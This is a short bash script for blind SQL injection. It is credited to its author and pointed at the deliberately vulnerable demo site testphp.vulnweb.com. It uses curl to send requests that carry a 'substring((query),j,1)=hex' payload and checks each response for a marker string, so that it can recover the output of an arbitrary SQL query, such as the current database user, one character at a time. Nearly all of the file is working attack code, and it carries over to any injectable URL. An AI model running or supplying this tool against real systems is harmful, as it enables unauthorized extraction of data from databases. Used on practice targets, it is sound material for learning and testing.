#!/bin/bash
# CC-BY: Osanda Malith Jayathissa (@OsandaMalith)
# https://creativecommons.org/licenses/by/2.0/
#./bssqli.sh 20 "select user()"

export URL="http://testphp.vulnweb.com/artists.php?artist=2"
export truestring="Blad3"
export maxlength=$1
export result=""
export query=$2
charset=`echo {0..9} {A..x} \. \: \, \- \_ \@`

for ((j=1;j<$maxlength;j+=1)); do
	for i in $charset; do
		export str=`echo -n $i| od -A n -t x1 |sed 's/ //g'`
		export hex=0x$str
		curl -s "$URL and substring(($query),$j,1)=$hex-- -" | grep "$truestring" &> /dev/null
		if [ "$?" == "0" ]
		then
			echo Found: $i
			export result+=$i
			break
		fi
	done
done

echo Result: $result
